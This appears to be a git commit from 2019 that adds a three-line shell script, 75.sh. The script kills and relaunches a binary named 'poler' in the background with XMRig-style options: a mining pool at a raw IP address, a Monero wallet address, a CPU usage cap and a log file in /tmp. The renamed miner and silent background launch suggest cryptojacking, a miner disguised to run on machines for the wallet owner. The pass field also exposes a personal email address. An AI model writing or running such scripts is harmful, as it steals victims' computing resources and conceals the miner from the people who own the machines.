59997e89fb3f3517b69410b50b18fcd2db52ab84
WilliamWizard <41175651+WilliamWizard@users.noreply.github.com>
2019-05-04 13:26:03 +0300

    405

---
+++ 75.sh
@@ -0,0 +1,3 @@
+pkill poler
+sleep 7
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 85 --cpu-priority 3 -o 109.234.37.63:5974 -u 49CbkXPhxYucb9hrGevFByNd5nGQ66BmdiRUUaUdkQtY1AW3G8qVrruFFkUCuyEDjnJfbcnhCfprBH3t3Luc4tN97AvbYh3 --pass=w4:ivanovandrey1984g@gmail.com -k
